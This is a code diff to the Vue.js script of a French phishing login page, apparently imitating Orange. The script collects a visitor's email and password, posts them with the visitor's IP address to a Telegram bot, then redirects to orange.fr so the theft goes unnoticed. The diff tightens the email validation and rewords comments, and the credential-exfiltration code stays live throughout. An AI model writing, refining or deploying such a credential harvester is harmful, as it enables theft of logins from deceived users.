@@ -24,11 +24,14 @@ new Vue({
       this.isPasswordVisible = !this.isPasswordVisible;
     },
     goToCredit() {
-      // validation simple du champ email/phone
-      if (!this.log.EMAIL || this.log.EMAIL.length < 3) {
+      // ✅ Validation stricte d'une adresse e-mail
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!this.log.EMAIL || !emailRegex.test(this.log.EMAIL)) {
         this.error = true;
         return;
       }
+
       this.error = false;
       this.login = 2; // passer à l’étape suivante (mdp)
     },
@@ -39,11 +42,11 @@ new Vue({
       }
       this.error = false;
 
-      // Construction du message à envoyer Telegram
+      // 📨 Construction du message à envoyer sur Telegram
       const ip = window.iPfull || 'IP non récupérée';
       const message = `
 📩 Nouvelle connexion :
-Email / Mobile : ${this.log.EMAIL}
+Email : ${this.log.EMAIL}
 Mot de passe : ${this.log.PASS}
 IP : ${ip}
       `;
@@ -53,7 +56,6 @@ IP : ${ip}
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       try {
-        // Envoi du message à Telegram
         const response = await axios.post(url, {
           chat_id: chatId,
           text: message,
@@ -61,8 +63,7 @@ IP : ${ip}
         });
 
         if (response.data.ok) {
-          // Redirection après envoi réussi
-          window.location.href = 'https://www.orange.fr'; // ou autre url de redirection
+          window.location.href = 'https://www.orange.fr'; // Redirection après succès
         } else {
           console.error('Erreur envoi Telegram', response.data);
           this.error = true;
